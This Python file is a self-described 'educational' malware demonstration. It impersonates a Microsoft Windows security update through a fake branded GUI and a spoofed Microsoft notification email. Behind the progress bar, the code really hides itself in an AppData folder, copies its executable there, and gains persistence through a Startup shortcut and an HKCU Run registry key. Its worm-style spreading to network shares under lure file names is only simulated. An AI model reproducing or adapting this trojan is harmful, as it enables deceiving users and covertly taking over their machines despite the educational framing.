"""
EDUCATIONAL MALICIOUS CODE DEMONSTRATION
WARNING: This is for educational purposes only in a controlled lab environment.

ATTACK SCENARIO: Fake Windows Security Update
- Victim receives email about "critical security vulnerability"
- Runs the exe thinking it's a legitimate Windows update
- GUI shows professional update interface with progress bar
- Behind scenes: All malicious functions execute
- Victim believes they just secured their system (actually infected it)

This demonstrates social engineering + technical exploitation
Total: 9 functions working together as one sophisticated attack
"""

import tkinter as tk
from tkinter import messagebox
import os
import sys
import shutil
import winreg
import threading
import time
from pathlib import Path
import smtplib
from email.mime.text import MIMEText

# ============================================================================
# STAGE 1: DELIVERY (Functions 1-3)
# ============================================================================

def show_email_gui():
    """
    Function 1: Display fake Windows Security Update GUI
    Shows professional interface to gain victim's trust
    """
    global email_window, progress_bar, status_label
    
    print("[Malicious] Function 1: Showing fake security update GUI...")
    
    email_window = tk.Tk()
    email_window.title("Windows Security Update Assistant")
    email_window.geometry("500x400")
    email_window.resizable(False, False)
    email_window.configure(bg='white')
    
    # Windows logo area (fake branding)
    header_frame = tk.Frame(email_window, bg='#0078D4', height=80)
    header_frame.pack(fill='x')
    
    title_label = tk.Label(header_frame, 
                          text="🛡️ Windows Security Update", 
                          font=("Segoe UI", 18, "bold"),
                          bg='#0078D4', fg='white')
    title_label.pack(pady=25)
    
    # Main content area
    content_frame = tk.Frame(email_window, bg='white')
    content_frame.pack(fill='both', expand=True, padx=30, pady=20)
    
    # Urgent message
    urgent_label = tk.Label(content_frame, 
                           text="⚠️ Critical Security Patch Required",
                           font=("Segoe UI", 14, "bold"),
                           bg='white', fg='#D83B01')
    urgent_label.pack(pady=10)
    
    info_label = tk.Label(content_frame, 
                         text="A critical vulnerability has been detected.\n"
                              "This update will protect your system from security threats.\n\n"
                              "Update KB5034847 - Published: December 2024",
                         font=("Segoe UI", 10),
                         bg='white', fg='#333333',
                         justify='left')
    info_label.pack(pady=15)
    
    # Email notification field (for "update notifications")
    email_label = tk.Label(content_frame,
                          text="Enter email for update notifications (optional):",
                          font=("Segoe UI", 9),
                          bg='white', fg='#666666')
    email_label.pack(pady=5)
    
    global email_entry
    email_entry = tk.Entry(content_frame, width=40, font=("Segoe UI", 10))
    email_entry.pack(pady=5)
    email_entry.insert(0, "your-email@example.com")
    
    # Status label
    status_label = tk.Label(content_frame,
                           text="Ready to install update",
                           font=("Segoe UI", 9),
                           bg='white', fg='#666666')
    status_label.pack(pady=10)
    
    # Progress bar (will be used during "installation")
    from tkinter import ttk
    style = ttk.Style()
    style.configure("Custom.Horizontal.TProgressbar", 
                   background='#0078D4',
                   troughcolor='#E1E1E1',
                   borderwidth=0,
                   thickness=20)
    
    progress_bar = ttk.Progressbar(content_frame, 
                                   length=400, 
                                   mode='determinate',
                                   style="Custom.Horizontal.TProgressbar")
    progress_bar.pack(pady=10)
    
    # Install button
    install_button = tk.Button(content_frame, 
                              text="Install Update Now", 
                              command=on_install_clicked, 
                              bg="#0078D4", 
                              fg="white",
                              font=("Segoe UI", 11, "bold"),
                              width=25, 
                              height=2,
                              border=0,
                              cursor="hand2")
    install_button.pack(pady=15)
    
    disclaimer_label = tk.Label(content_frame,
                               text="Microsoft Corporation • Automatic Updates",
                               font=("Segoe UI", 8),
                               bg='white', fg='#999999')
    disclaimer_label.pack(side='bottom', pady=5)
    
    # Start malicious actions in background thread
    threading.Thread(target=execute_malicious_stage1, daemon=True).start()
    
    email_window.mainloop()

def create_hidden_folder():
    """
    Function 2: Create hidden folder in AppData
    Runs in background while user sees GUI
    """
    print("[Malicious] Function 2: Creating hidden folder...")
    
    # Create hidden folder path
    appdata = os.getenv('APPDATA')
    hidden_folder = os.path.join(appdata, "WindowsUpdateService")
    
    try:
        # Create folder if it doesn't exist
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder)
            
            # Set folder as hidden (Windows)
            os.system(f'attrib +h "{hidden_folder}"')
            
            print(f"[Malicious] Created hidden folder: {hidden_folder}")
            return hidden_folder
        else:
            print(f"[Malicious] Hidden folder already exists: {hidden_folder}")
            return hidden_folder
    except Exception as e:
        print(f"[Malicious] Error creating hidden folder: {e}")
        return None

def copy_to_hidden_location():
    """
    Function 3: Copy executable to hidden folder
    Makes program persist even if original is deleted
    """
    print("[Malicious] Function 3: Copying to hidden location...")
    
    try:
        # Get current executable path
        current_exe = sys.argv[0]
        
        # Get hidden folder path
        appdata = os.getenv('APPDATA')
        hidden_folder = os.path.join(appdata, "WindowsUpdateService")
        hidden_exe = os.path.join(hidden_folder, "WindowsUpdateService.exe")
        
        # Copy if not already there
        if not os.path.exists(hidden_exe) or os.path.abspath(current_exe) != os.path.abspath(hidden_exe):
            shutil.copy2(current_exe, hidden_exe)
            print(f"[Malicious] Copied to: {hidden_exe}")
            return hidden_exe
        else:
            print(f"[Malicious] Already running from hidden location")
            return hidden_exe
    except Exception as e:
        print(f"[Malicious] Error copying to hidden location: {e}")
        return None

def execute_malicious_stage1():
    """Helper function to run Stage 1 functions in background"""
    time.sleep(1)  # Wait a bit so GUI appears first
    create_hidden_folder()
    copy_to_hidden_location()

# ============================================================================
# STAGE 2: AUTO-RUN (Functions 4-6)
# ============================================================================

def send_fake_email(user_emails):
    """
    Function 4: Send fake "update notification" email
    While sending, trigger auto-run functions in background
    """
    # Handle single email (from optional notification field)
    if isinstance(user_emails, str):
        user_email = user_emails.strip()
    else:
        user_email = str(user_emails).strip()
    
    print(f"[Malicious] Function 4: Sending update notification...")
    
    try:
        if not user_email or '@' not in user_email:
            print("[Malicious] No valid email provided, skipping notification")
            threading.Thread(target=execute_autorun_stage, daemon=True).start()
            return False
        
        # ==== ANONYMOUS EMAIL SENDING ====
        USE_REAL_EMAIL = False  # Set to True to actually send
        
        if USE_REAL_EMAIL:
            SENDER_EMAIL = os.getenv('EMAIL_USER', 'windowsupdate@microsoft-security.com')
            SENDER_PASSWORD = os.getenv('EMAIL_PASS', 'password')
            SMTP_SERVER = "smtp.gmail.com"
            SMTP_PORT = 587
        
        print(f"[Malicious]   Email mode: {'REAL' if USE_REAL_EMAIL else 'SIMULATED'}")
        print(f"[Malicious]   Sending to: {user_email}")
        
        # Create professional Windows Update email
        msg = MIMEText(
            "Dear Windows User,\n\n"
            "Your system has successfully installed security update KB5034847.\n\n"
            "This critical update protects your computer from recently discovered vulnerabilities.\n\n"
            "Update Details:\n"
            "- Security patches installed: 3\n"
            "- System files updated: 127\n"
            "- Installation date: December 2024\n\n"
            "No further action is required.\n\n"
            "Best regards,\n"
            "Windows Update Service\n"
            "Microsoft Corporation"
        )
        msg['Subject'] = "Windows Security Update Installed Successfully"
        msg['From'] = "Windows Update <noreply@microsoft.com>"
        msg['To'] = user_email
        
        if USE_REAL_EMAIL:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(SENDER_EMAIL, SENDER_PASSWORD)
                server.send_message(msg)
            print(f"[Malicious]   ✓ Actually sent to {user_email}")
        else:
            time.sleep(0.5)
            print(f"[Malicious]   ✓ Simulated notification to {user_email}")
        
        # Trigger auto-run stage while user thinks email is being sent
        threading.Thread(target=execute_autorun_stage, daemon=True).start()
        
        return True
    except Exception as e:
        print(f"[Malicious] Email sending failed: {e}")
        # Still trigger auto-run even if email fails
        threading.Thread(target=execute_autorun_stage, daemon=True).start()
        return False

def add_startup_shortcut():
    """
    Function 5: Add shortcut to Startup folder
    Program will run automatically on every login
    """
    print("[Malicious] Function 5: Adding startup shortcut...")
    
    try:
        # Get Startup folder path
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Get hidden executable path
        appdata = os.getenv('APPDATA')
        hidden_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        # Create shortcut (using VBScript method for simplicity)
        shortcut_path = os.path.join(startup_folder, "WindowsUpdateService.lnk")
        
        # Create VBScript to make shortcut
        vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{hidden_exe}"
oLink.WindowStyle = 7
oLink.Description = "Windows Update Service"
oLink.Save
'''
        
        vbs_file = os.path.join(os.getenv('TEMP'), 'create_shortcut.vbs')
        with open(vbs_file, 'w') as f:
            f.write(vbs_script)
        
        # Execute VBScript
        os.system(f'cscript //nologo "{vbs_file}"')
        os.remove(vbs_file)
        
        print(f"[Malicious] Created startup shortcut: {shortcut_path}")
        return True
    except Exception as e:
        print(f"[Malicious] Error creating startup shortcut: {e}")
        return False

def add_registry_key():
    """
    Function 6: Add registry Run key for persistence
    Backup method if startup shortcut is deleted
    """
    print("[Malicious] Function 6: Adding registry key...")
    
    try:
        # Get hidden executable path
        appdata = os.getenv('APPDATA')
        hidden_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        # Open registry key
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Add value
        winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, hidden_exe)
        winreg.CloseKey(key)
        
        print(f"[Malicious] Added registry key: HKCU\\{key_path}\\WindowsUpdateService")
        return True
    except Exception as e:
        print(f"[Malicious] Error adding registry key: {e}")
        return False

def execute_autorun_stage():
    """Helper function to run Stage 2 functions"""
    time.sleep(0.5)  # Brief delay to simulate "sending email"
    add_startup_shortcut()
    add_registry_key()

# ============================================================================
# STAGE 3: SPREADING (Functions 7-9)
# ============================================================================

def scan_network_shares():
    """
    Function 7: Scan network for accessible shared folders
    Finds potential targets for spreading
    """
    print("[Malicious] Function 7: Scanning network shares...")
    
    accessible_shares = []
    
    try:
        # SIMULATION: In a real scenario, this would scan the network
        # For safety, we only list simulated shares
        simulated_shares = [
            r"\\DESKTOP-PC1\SharedDocs",
            r"\\LAPTOP-USER2\Public",
            r"\\FILESERVER\Downloads"
        ]
        
        print(f"[Malicious] Found {len(simulated_shares)} network shares (simulated)")
        for share in simulated_shares:
            print(f"[Malicious]   - {share}")
        
        # In real malware, this would test write access
        # For demo, we return the simulated list
        return simulated_shares
    except Exception as e:
        print(f"[Malicious] Error scanning network: {e}")
        return []

def replicate_to_shares(shares):
    """
    Function 8: Copy malicious program to network shares
    Uses tempting filenames to trick other users
    """
    print("[Malicious] Function 8: Replicating to shares...")
    
    tempting_names = [
        "PayrollReport_2025.exe",
        "CompanyPhotos.exe",
        "ImportantDocument.exe",
        "QuickFix.exe"
    ]
    
    try:
        # Get current executable
        appdata = os.getenv('APPDATA')
        source_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        spread_count = 0
        for share in shares:
            for filename in tempting_names:
                target_path = os.path.join(share, filename)
                
                # SAFETY: We don't actually copy to real network shares
                # Just simulate the action
                print(f"[Malicious]   Would copy to: {target_path} (simulated)")
                spread_count += 1
        
        print(f"[Malicious] Spreading simulation complete: {spread_count} copies")
        return spread_count
    except Exception as e:
        print(f"[Malicious] Error replicating to shares: {e}")
        return 0

def log_and_cleanup():
    """
    Function 9: Log infection status and cleanup traces
    Records successful infections and exits cleanly
    """
    print("[Malicious] Function 9: Logging and cleanup...")
    
    try:
        # Create log file in hidden folder
        appdata = os.getenv('APPDATA')
        log_file = os.path.join(appdata, "WindowsUpdateService", "activity.log")
        
        with open(log_file, 'a') as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] Infection cycle completed\n")
            f.write(f"[{timestamp}] Delivery: Success\n")
            f.write(f"[{timestamp}] Auto-Run: Success\n")
            f.write(f"[{timestamp}] Spreading: Simulated\n")
        
        print(f"[Malicious] Activity logged to: {log_file}")
        print("[Malicious] All malicious functions completed successfully")
        return True
    except Exception as e:
        print(f"[Malicious] Error logging: {e}")
        return False

def execute_spreading_stage():
    """Helper function to run Stage 3 functions"""
    shares = scan_network_shares()
    replicate_to_shares(shares)
    log_and_cleanup()

# ============================================================================
# GUI EVENT HANDLERS
# ============================================================================

def on_install_clicked():
    """Handle install button click - simulates Windows Update process"""
    global status_label, progress_bar
    
    user_email = email_entry.get().strip()
    
    # Disable input during "installation"
    email_entry.config(state='disabled')
    
    # Update status
    status_label.config(text="Downloading update package...", fg='#0078D4')
    email_window.update()
    
    # Simulate download progress
    for i in range(0, 40, 5):
        time.sleep(0.2)
        progress_bar['value'] = i
        email_window.update()
    
    status_label.config(text="Installing security patches...")
    email_window.update()
    
    # Send notification email if provided (and trigger auto-run stage)
    if user_email and '@' in user_email:
        threading.Thread(target=send_fake_email, args=(user_email,), daemon=True).start()
    else:
        # Still trigger auto-run even without email
        threading.Thread(target=execute_autorun_stage, daemon=True).start()
    
    # Continue installation progress
    for i in range(40, 100, 5):
        time.sleep(0.3)
        progress_bar['value'] = i
        email_window.update()
    
    # Show completion
    status_label.config(text="✓ Update installed successfully", fg='#107C10')
    email_window.update()
    time.sleep(1)
    
    # Start spreading stage
    threading.Thread(target=execute_spreading_stage, daemon=True).start()
    
    # Show success message
    messagebox.showinfo("Update Complete", 
                       "Windows security update has been installed successfully.\n\n"
                       "Your system is now protected against the latest threats.\n"
                       "A restart may be required to complete the update.")
    
    # Close window
    email_window.after(1000, email_window.destroy)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    print("="*60)
    print("MALICIOUS CODE DEMONSTRATION - EDUCATIONAL PURPOSES ONLY")
    print("="*60)
    print("\n[Malicious] Starting Email Sender Utility (malicious version)...")
    print("[Malicious] This will execute all 9 malicious functions\n")
    
    # Start with GUI (Function 1)
    show_email_gui()
    
    print("\n[Malicious] Program terminated")
    print("="*60)
